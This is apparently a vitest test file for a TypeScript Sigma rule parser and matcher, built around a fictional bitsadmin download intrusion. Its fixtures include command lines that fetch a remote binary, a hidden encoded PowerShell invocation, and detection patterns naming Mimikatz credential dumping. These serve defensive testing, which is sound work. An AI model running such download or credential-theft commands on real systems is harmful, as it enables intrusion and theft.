import { describe, expect, it } from "vitest";
import { matchSigma, parseSigma, type SigmaRule } from "./index";
import { parseYaml, toPlain } from "./yamlLite";

const BITS_RULE = String.raw`
title: BITSAdmin Download Transfer
id: 2b1f6c1e-4d7a-4b52-9c0e-6f1d2a3b4c5d
status: experimental
description: |
  Detects bitsadmin (or a renamed copy) creating a download job.
  Seen in the Pelham calhelper intrusion.
author: Pelham DCA
date: 2026-11-10
tags:
  - attack.defense-evasion
  - attack.t1197
logsource:
  category: process_creation
  product: windows
detection:
  selection_img:
    - Image|endswith: '\bitsadmin.exe'
    - OriginalFileName: 'bitsadmin.exe'
  selection_cli:
    CommandLine|windash|contains|all:
      - ' -transfer '
      - 'http'
  condition: all of selection_*   # both parts must hit
falsepositives:
  - Software updaters that still use BITS from the command line
level: high
`;

const proc = (Image: string, CommandLine: string, OriginalFileName: string, ParentImage = "C:\\Windows\\explorer.exe", User = "PELHAM\\j.morris") => ({
  Image, CommandLine, OriginalFileName, ParentImage, User,
});

const MALICIOUS = [
  proc(
    "C:\\Windows\\System32\\bitsadmin.exe",
    "C:\\Windows\\System32\\bitsadmin.exe /transfer upd /download /priority high http://198.51.100.58/c.bin C:\\ProgramData\\Pelham\\calhelper.exe",
    "bitsadmin.exe",
  ),
  proc(
    "C:\\Windows\\System32\\bitsadmin.exe",
    "bitsadmin.exe /TRANSFER upd /download /priority high http://198.51.100.58/c.bin C:\\ProgramData\\Pelham\\calhelper.exe",
    "bitsadmin.exe",
  ),
  proc(
    "C:\\Windows\\System32\\bitsadmin.exe",
    "bitsadmin -transfer upd -download -priority high http://198.51.100.58/c.bin C:\\ProgramData\\Pelham\\calhelper.exe",
    "bitsadmin.exe",
    "C:\\Windows\\System32\\cmd.exe",
  ),
  proc(
    "C:\\Users\\Public\\svc.exe",
    "C:\\Users\\Public\\svc.exe /transfer upd /download /priority high http://198.51.100.58/c.bin C:\\ProgramData\\Pelham\\calhelper.exe",
    "bitsadmin.exe",
  ),
];

const BENIGN = [
  proc("C:\\Windows\\System32\\bitsadmin.exe", "bitsadmin /list /allusers", "bitsadmin.exe", "C:\\Windows\\System32\\cmd.exe", "PELHAM\\it.admin"),
  proc("C:\\Windows\\System32\\svchost.exe", "C:\\Windows\\system32\\svchost.exe -k netsvcs -p -s BITS", "svchost.exe", "C:\\Windows\\System32\\services.exe", "NT AUTHORITY\\SYSTEM"),
];

function rule(src: string): SigmaRule {
  const p = parseSigma(src);
  if (!p.ok) throw new Error(`parse failed: ${p.error.message} (line ${p.error.line})`);
  return p.rule;
}

function errorOf(src: string): { message: string; line: number } {
  const p = parseSigma(src);
  if (p.ok) throw new Error("expected a parse error");
  return p.error;
}

/** A minimal rule around one detection block, for feature tests. */
const wrap = (detection: string) => `title: t\nlevel: low\nlogsource:\n  product: windows\ndetection:\n${detection}`;
const hit = (detection: string, ev: Record<string, unknown>) => matchSigma(rule(wrap(detection)), ev).matched;

describe("BITSAdmin scenario", () => {
  it("parses metadata", () => {
    const p = parseSigma(BITS_RULE);
    expect(p.ok).toBe(true);
    if (!p.ok) return;
    expect(p.rule.title).toBe("BITSAdmin Download Transfer");
    expect(p.rule.level).toBe("high");
    expect(p.rule.tags).toEqual(["attack.defense-evasion", "attack.t1197"]);
    expect(p.rule.logsource).toEqual({ category: "process_creation", product: "windows" });
    expect(p.rule.description).toContain("renamed copy");
    expect(p.rule.date).toBe("2026-11-10");
    expect(p.warnings).toEqual([]);
  });

  it("catches all four malicious events and no benign ones", () => {
    const r = rule(BITS_RULE);
    for (const ev of MALICIOUS) expect(matchSigma(r, ev).matched, ev.CommandLine).toBe(true);
    for (const ev of BENIGN) expect(matchSigma(r, ev).matched, ev.CommandLine).toBe(false);
  });

  it("reports which selections hit", () => {
    const r = rule(BITS_RULE);
    expect(matchSigma(r, BENIGN[0]).selections).toEqual({ selection_img: true, selection_cli: false });
    expect(matchSigma(r, MALICIOUS[3]).selections).toEqual({ selection_img: true, selection_cli: true });
  });

  it("without windash the /transfer spellings slip through", () => {
    const r = rule(BITS_RULE.replace("CommandLine|windash|contains|all", "CommandLine|contains|all"));
    expect(matchSigma(r, MALICIOUS[2]).matched).toBe(true); // literally " -transfer "
    expect(matchSigma(r, MALICIOUS[0]).matched).toBe(false); // the /transfer form slips through
    expect(matchSigma(r, MALICIOUS[1]).matched).toBe(false);
  });

  it("an Image-only selection misses the renamed copy", () => {
    const r = rule(BITS_RULE.replace("    - OriginalFileName: 'bitsadmin.exe'\n", ""));
    expect(matchSigma(r, MALICIOUS[3]).matched).toBe(false);
  });
});

describe("value semantics", () => {
  const ev = {
    Image: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    CommandLine: "powershell.exe -nop -w hidden -enc SQBFAFgA",
    EventID: 4688,
    DestinationIp: "10.20.30.40",
    Empty: "",
    Hashes: ["SHA256=AB", "MD5=CD"],
    Process: { Parent: { Name: "winword.exe" } },
    Path: "C:\\Temp\\a*b.txt",
  };

  it("equality is case-insensitive unless cased", () => {
    expect(hit("  s:\n    image: 'c:\\windows\\system32\\windowspowershell\\v1.0\\POWERSHELL.EXE'\n  condition: s", ev)).toBe(true);
    expect(hit("  s:\n    Image|endswith|cased: '\\POWERSHELL.EXE'\n  condition: s", ev)).toBe(false);
    expect(hit("  s:\n    Image|endswith|cased: '\\powershell.exe'\n  condition: s", ev)).toBe(true);
  });

  it("wildcards, escapes, startswith, lists and numbers", () => {
    expect(hit("  s:\n    Image: '*\\powershell.ex?'\n  condition: s", ev)).toBe(true);
    expect(hit("  s:\n    Path: 'C:\\Temp\\a\\*b.txt'\n  condition: s", ev)).toBe(true);
    expect(hit("  s:\n    Path: 'C:\\Temp\\a\\*c.txt'\n  condition: s", ev)).toBe(false);
    expect(hit("  s:\n    CommandLine|startswith: ['cmd.exe', 'POWERSHELL']\n  condition: s", ev)).toBe(true);
    expect(hit("  s:\n    EventID: 4688\n  condition: s", ev)).toBe(true);
    expect(hit("  s:\n    EventID:\n      - 1\n      - '4688'\n  condition: s", ev)).toBe(true);
    expect(hit("  s:\n    Hashes|contains: 'md5='\n  condition: s", ev)).toBe(true);
    expect(hit("  s:\n    Process.Parent.Name: 'WINWORD.EXE'\n  condition: s", ev)).toBe(true);
  });

  it("null, exists, numeric and cidr", () => {
    expect(hit("  s:\n    Missing: null\n  condition: s", ev)).toBe(true);
    expect(hit("  s:\n    Empty: null\n  condition: s", ev)).toBe(true);
    expect(hit("  s:\n    Image: null\n  condition: s", ev)).toBe(false);
    expect(hit("  s:\n    Image|exists: true\n  condition: s", ev)).toBe(true);
    expect(hit("  s:\n    Missing|exists: false\n  condition: s", ev)).toBe(true);
    expect(hit("  s:\n    EventID|gt: 4000\n  condition: s", ev)).toBe(true);
    expect(hit("  s:\n    EventID|lte: 4687\n  condition: s", ev)).toBe(false);
    expect(hit("  s:\n    DestinationIp|cidr: '10.20.0.0/16'\n  condition: s", ev)).toBe(true);
    expect(hit("  s:\n    DestinationIp|cidr:\n      - '192.168.0.0/16'\n      - '172.16.0.0/12'\n  condition: s", ev)).toBe(false);
  });

  it("re runs on the linear engine, with i flag", () => {
    expect(hit("  s:\n    CommandLine|re: '-w\\s+hid+en'\n  condition: s", ev)).toBe(true);
    expect(hit("  s:\n    CommandLine|re: '-W HIDDEN'\n  condition: s", ev)).toBe(false);
    expect(hit("  s:\n    CommandLine|re|i: '-W HIDDEN'\n  condition: s", ev)).toBe(true);
    const start = Date.now();
    expect(hit("  s:\n    CommandLine|re: '(a|aa)*(a|a)*z$'\n  condition: s", { CommandLine: "a".repeat(5000) })).toBe(false);
    expect(Date.now() - start).toBeLessThan(5000);
  });

  it("base64offset finds a value at any alignment", () => {
    const target = "Invoke-Mimikatz";
    for (const prefix of ["", "x", "xy"]) {
      const encoded = btoa(prefix + target + " -DumpCreds");
      expect(hit("  s:\n    CommandLine|base64offset|contains: 'Invoke-Mimikatz'\n  condition: s", { CommandLine: `powershell -enc ${encoded}` }), prefix).toBe(true);
    }
    expect(hit("  s:\n    CommandLine|base64|contains: 'Invoke'\n  condition: s", { CommandLine: btoa("Invoke") })).toBe(true);
  });

  it("keyword lists search every value", () => {
    expect(hit("  keywords:\n    - 'HIDDEN -ENC'\n    - 'mimikatz'\n  condition: keywords", ev)).toBe(true);
    expect(hit("  keywords:\n    - 'mimikatz'\n  condition: keywords", ev)).toBe(false);
  });

  it("condition operators, 1 of, them and not", () => {
    const det = "  sel:\n    Image|endswith: '\\powershell.exe'\n  filter_a:\n    CommandLine|contains: '-nop'\n  filter_b:\n    User: 'SYSTEM'\n";
    expect(hit(det + "  condition: sel and not 1 of filter_*", ev)).toBe(false);
    expect(hit(det + "  condition: sel and not all of filter_*", ev)).toBe(true);
    expect(hit(det + "  condition: (sel or filter_b) and filter_a", ev)).toBe(true);
    expect(hit(det + "  condition: 1 of them and not filter_b", ev)).toBe(true);
    expect(hit(det + "  condition: all of them", ev)).toBe(false);
  });
});

describe("warnings", () => {
  it("flags missing level, missing logsource and literal IOCs", () => {
    const p = parseSigma(
      "title: t\ndetection:\n  sel:\n    DestinationIp: '198.51.100.58'\n    Hashes|contains: 'd41d8cd98f00b204e9800998ecf8427e'\n  unused:\n    User: x\n  condition: sel\n",
    );
    expect(p.ok).toBe(true);
    if (!p.ok) return;
    const w = p.warnings.join("\n");
    expect(w).toContain("no 'level'");
    expect(w).toContain("no 'logsource'");
    expect(w).toContain("literal IP 198.51.100.58");
    expect(w).toContain("literal hash");
    expect(w).toContain("'unused' is defined but not used");
  });
});

describe("errors", () => {
  it.each([
    [wrap("  s:\n    Image|endwith: 'x'\n  condition: s"), "Unknown modifier 'endwith'. Did you mean 'endswith'?", 7],
    [wrap("  s:\n    Image|frobnicate: 'x'\n  condition: s"), "Unknown modifier 'frobnicate'", 7],
    [wrap("  selection:\n    Image: x\n  condition: selection and not filter_backup"), "condition references 'filter_backup', which is not defined", 8],
    [wrap("  selection:\n    Image: x\n  condition: any of selection*"), "'any of' is not Sigma; use '1 of'", 8],
    [wrap("  selection:\n    Image: x\n  condition: 2 of selection*"), "only has '1 of' and 'all of'", 8],
    [wrap("  selection:\n    Image: x\n  condition: 1 of filter_*"), "does not match any search identifier", 8],
    [wrap("  selection:\n    Image: x\n  condition: selection | count() > 5"), "aggregation", 8],
    [wrap("  selection:\n    Image: x"), "detection has no 'condition'", 5],
    [wrap("  s:\n    Image|re: '(?<=x)y'\n  condition: s"), "invalid regular expression", 7],
    [wrap("  s:\n    Image|re|contains: 'x'\n  condition: s"), "cannot be combined", 7],
    [wrap("  s:\n    Image|i: 'x'\n  condition: s"), "only work together with re", 7],
    [wrap("  s:\n    Ip|cidr: '2001:db8::/32'\n  condition: s"), "only IPv4", 7],
    [wrap("  s:\n    Image: *bitsadmin.exe\n  condition: s"), "aliases (*name) are not allowed", 7],
    ["title: &a t\ndetection:\n  s:\n    x: 1\n  condition: s", "anchors (&name) are not allowed", 1],
    ["title: !!str t\ndetection:\n  s:\n    x: 1\n  condition: s", "tags (!tag, !!type) are not allowed", 1],
    ["title: a\n---\ntitle: b", "multiple YAML documents", 2],
    ["level: high\ndetection:\n  s:\n    x: 1\n  condition: s", "missing required field 'title'", 1],
    ["title: t\nlevel: high", "missing required field 'detection'", 1],
    ["title: t\ntitle: u\n", "duplicate key 'title'", 2],
    ["title: t\ndetection:\n\ts:\n    x: 1", "tab characters", 3],
    ["title: \"C:\\Windows\"\n", "invalid escape", 1],
    ["title: t\nlogsource: windows\ndetection:\n  s:\n    x: 1\n  condition: s", "'logsource' must be a map", 2],
  ])("%#: %s", (src, message, line) => {
    const e = errorOf(src);
    expect(e.message).toContain(message);
    expect(e.line).toBe(line);
  });

  it("caps input size and nesting depth", () => {
    expect(errorOf("title: t\n" + "#".repeat(33 * 1024)).message).toContain("too large");
    let deep = "a:\n";
    for (let d = 1; d <= 12; d++) deep += " ".repeat(d * 2) + "k:\n";
    deep += " ".repeat(26) + "v: 1\n";
    expect(errorOf(deep).message).toContain("nesting too deep");
  });
});

describe("yamlLite", () => {
  it("parses the supported subset", () => {
    const y = toPlain(
      parseYaml(
        [
          "--- # leading marker is fine",
          "a: plain value # comment",
          "b: 'it''s quoted'",
          'c: "tab\\there"',
          "d: [1, 'two', \"three\", true, null]",
          "e:",
          "- x",
          "- k: v",
          "  k2: v2",
          "f: |",
          "  line one",
          "  # not a comment",
          "g: >-",
          "  folded",
          "  text",
          "h: 0x10",
          "i: ~",
          "j: plain",
          "   continued",
        ].join("\n"),
      ),
    );
    expect(y).toEqual({
      a: "plain value",
      b: "it's quoted",
      c: "tab\there",
      d: [1, "two", "three", true, null],
      e: ["x", { k: "v", k2: "v2" }],
      f: "line one\n# not a comment\n",
      g: "folded text",
      h: 16,
      i: null,
      j: "plain continued",
    });
  });
});
